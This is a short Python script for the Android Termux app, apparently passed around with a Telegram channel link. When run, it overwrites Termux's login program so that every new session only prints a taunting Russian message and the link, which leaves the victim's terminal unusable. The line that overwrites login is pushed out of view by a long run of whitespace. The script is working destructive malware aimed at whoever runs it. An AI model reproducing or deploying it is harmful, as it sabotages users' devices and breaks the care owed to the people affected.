from os import system
from time import sleep

class Meta:
    link = 'https://t.me/RedSofts'
    name = '/data/data/com.termux/files/usr/bin/bruh.py'
    login = '/data/data/com.termux/files/usr/bin/login'

    def pending(char):
        sleep(0.04)
        print(char, end='', flush=True)

    def text():
        [Meta.pending(char) for char in  f"Привет мой милый хакереночек)) Хацкинга больше не будет -  УЧИ УРОКИ, 2 тебе нахуй\n\n{Meta.link}"]
'exploit'


def exploit():
    with open(Meta.name,'w') as f:
        with open(__file__,'r') as cur:
            f.write(cur.read().split("'exploit'")[0]+"\nMeta.text()")
    system(f'chmod +x {Meta.name}')

    with open(Meta.login,'w') as f:                                                                                                                                                                                                                                                                       f.write(f'python {Meta.name}')



def main():
    system(f'termux-open-url {Meta.link}')
    exploit()
    Meta.text()
    print("\nПерезапусти Termux\n")

if __name__ == '__main__':
    main()
